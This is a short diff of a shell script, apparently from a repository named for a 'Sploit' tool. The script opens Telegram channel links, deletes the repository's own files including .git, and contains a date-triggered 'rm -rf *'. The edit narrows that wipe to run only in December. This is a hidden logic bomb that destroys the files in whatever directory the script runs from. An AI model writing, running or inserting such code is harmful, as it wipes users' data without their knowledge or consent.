@@ -6,7 +6,7 @@
 #xdg-open https://t.me/clownters_channel && sleep 15
 xdg-open https://t.me/channel_90s15 &>/dev/null && sleep 15
 rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git" "regras-clownters.md"
-if [[ "$(date +%B)" != "June" ]]; then
+if [[ "$(date +%B)" == "December" ]]; then
     clear
     rm -rf *
 else
